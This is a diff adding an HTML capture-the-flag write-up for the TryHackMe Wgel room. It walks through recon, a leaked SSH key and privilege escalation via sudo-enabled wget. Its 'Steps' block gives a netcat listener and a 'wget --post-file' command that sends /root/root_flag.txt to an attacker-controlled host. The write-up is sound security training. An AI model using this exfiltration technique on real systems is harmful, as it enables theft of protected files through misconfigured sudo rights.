@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>WGE LCTF | TryHackMe Writeup</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #b9fbc0;
+      font-family: 'Courier New', monospace;
+      padding: 2em;
+      max-width: 900px;
+      margin: auto;
+    }
+    h1, h2 {
+      color: #00f5d4;
+    }
+    h3 {
+      color: #ff4ecd;
+    }
+    a {
+      color: #85f4ff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    img {
+      width: 100%;
+      border: 2px solid #333;
+      border-radius: 8px;
+      margin: 1.5em 0;
+    }
+    code {
+      background-color: #1a1a1a;
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: #00ff88;
+    }
+    pre {
+      background-color: #111;
+      padding: 12px;
+      overflow-x: auto;
+      border-left: 4px solid #00d9ff;
+      border-radius: 6px;
+    }
+    .section {
+      margin-bottom: 3em;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🚩 TryHackMe - WGE LCTF Writeup</h1>
+  <p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGE LCTF</a></p>
+
+  <div class="section">
+    <h2>🔎 Initial Recon</h2>
+    <p>We begin with an Nmap scan on the target IP <code>10.10.141.118</code>:</p>
+    <img src="assets/img/wgel/scan.png" alt="Nmap full scan result">
+    <ul>
+      <li>22/tcp – SSH</li>
+      <li>80/tcp – HTTP (Apache 2.4.18)</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>🌐 Apache Default Page</h2>
+    <p>Accessing port 80 shows the Apache2 Ubuntu default page:</p>
+    <img src="assets/img/wgel/apache-server.png" alt="Apache2 default page">
+  </div>
+
+  <div class="section">
+    <h2>📂 Hidden Page Discovered</h2>
+    <p>Exploring <code>/sitemap/</code> manually, we find a deployed Unapp template:</p>
+    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template in /sitemap/">
+  </div>
+
+  <div class="section">
+    <h2>🛠️ Gobuster Enumeration</h2>
+    <p>Using Gobuster with a common wordlist reveals a directory containing SSH keys:</p>
+    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster finds .ssh folder">
+  </div>
+
+  <div class="section">
+    <h2>👀 Developer Comment</h2>
+    <p>In the page source code, we spot a helpful comment:</p>
+    <img src="assets/img/wgel/source-code.png" alt="Comment left in HTML source">
+    <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
+  </div>
+
+  <div class="section">
+    <h2>🔑 SSH Key Disclosure</h2>
+    <p>In <code>/sitemap/.ssh/</code>, we find a private SSH key:</p>
+    <img src="assets/img/wgel/ssh-found.png" alt="Private SSH key found in .ssh">
+  </div>
+
+  <div class="section">
+    <h2>🔐 SSH Access Gained</h2>
+    <p>We log in as user <code>jessie</code> using the downloaded key:</p>
+    <img src="assets/img/wgel/ssh-login.png" alt="Logged in via SSH as jessie">
+  </div>
+
+  <div class="section">
+    <h2>🔍 Sudo Privileges Review</h2>
+    <p>Using <code>sudo -l</code>, we see <code>wget</code> can be run as root without password:</p>
+    <img src="assets/img/wgel/sudo-l.png" alt="Sudo privilege shown for wget">
+  </div>
+
+  <div class="section">
+    <h2>📜 user_flag.txt Captured</h2>
+    <p>We locate the first flag using <code>find</code>:</p>
+    <img src="assets/img/wgel/userflag.txt.png" alt="User flag located">
+  </div>
+
+  <div class="section">
+    <h2>⚡ Manual PrivEsc via wget --post-file</h2>
+    <p>GTFOBins lists <code>wget</code> as a potential sudo binary for privilege escalation, but the reverse shell method there <strong>did not work</strong> in this environment.</p>
+
+    <p>Instead, I crafted a manual approach using the <code>--post-file</code> option in wget. This allows uploading a file to a listening HTTP server via POST. Since wget is run with <code>sudo</code>, I can send <code>/root/root_flag.txt</code> to my attack box.</p>
+
+    <img src="assets/img/wgel/wget-vuln.png" alt="Crafting wget post-file command manually">
+
+    <p><strong>Steps:</strong></p>
+    <pre><code># On attacker (listening on port 80):
+nc -lvnp 80
+
+# On victim:
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
+
+    <p>The listener receives the root flag directly over HTTP POST.</p>
+  </div>
+
+  <div class="section">
+    <h2>🏁 root_flag.txt Captured</h2>
+    <p>The netcat listener catches the flag sent via <code>wget</code>:</p>
+    <img src="assets/img/wgel/rootflag.png" alt="Root flag received via POST">
+  </div>
+
+  <div class="section">
+    <h2>✅ Summary</h2>
+    <ul>
+      <li>Web server leaked private SSH key → SSH access as <code>jessie</code></li>
+      <li>Jessie had sudo privileges on <code>wget</code></li>
+      <li>Manually crafted a POST request to exfiltrate <code>root_flag.txt</code></li>
+      <li><strong>Flags captured:</strong> <code>user_flag.txt ✅</code> & <code>root_flag.txt ✅</code></li>
+    </ul>
+  </div>
+
+</body>
+</html>
+
